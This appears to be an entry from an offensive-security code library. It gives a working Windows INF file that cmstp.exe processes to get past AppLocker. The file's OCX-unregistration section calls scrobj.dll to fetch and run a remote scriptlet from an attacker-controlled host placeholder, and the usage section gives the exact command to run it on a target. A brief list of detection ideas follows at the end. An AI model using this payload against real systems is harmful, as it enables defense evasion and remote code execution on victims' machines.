---
id: 0e68dd28-bd52-46f3-8eee-053a6c63dc93
type: code
name: pwn-inf-file-for-remote-sct-execution
language: inf
verified: true
created_at: '2020-02-21T05:47:48.571487+00:00'
updated_at: '2023-05-29T16:48:53.365139+00:00'
platforms:
  - Windows
tags:
  - defense-evasion
  - inf-file
validated: true
---

# pwn-inf-file-for-remote-sct-execution

## Code

```inf
[version]
Signature=$chicago$
AdvancedINF=2.5

[DefaultInstall_SingleUser]
UnRegisterOCXs=UnRegisterOCXSection

[UnRegisterOCXSection]
%11%\scrobj.dll,NI,http://$_ATTACKER_IP/pwn.sct

[Strings]
AppAct="SOFTWARE\Microsoft\Connection Manager"
ServiceName="Corp"
ShortSvcName="Corp"
```

## Description

This INF file is designed to be processed by cmstp.exe. It simulates an OCX unregistration that fetches and executes a remote SCT file via scrobj.dll, enabling scriptlet execution in an AppLocker-restricted environment.

## Parameters

| Variable | Description | Example |
|----------|-------------|---------|
| $_ATTACKER_IP | IP address of the attacker's web server hosting pwn.sct | 192.168.1.100 |

## Usage

Save as pwn.inf and execute via cmstp.exe /ni /s pwn.inf on the target. Requires the SCT file to be hosted at http://$_ATTACKER_IP/pwn.sct. Used in defense evasion chains to load remote scripts.

## Detection

- Monitor cmstp.exe process creation with INF arguments (Sysmon Event ID 1).
- Network logs for HTTP requests to unusual SCT endpoints.
- File creation events for INF files in temp or tasks directories.

## Related

- [[procedures/Windows-AppLocker-Whitelist-Bypass-via-cmstp]]
- [[codes/pwn-sct-file-for-local-payload-launch]]
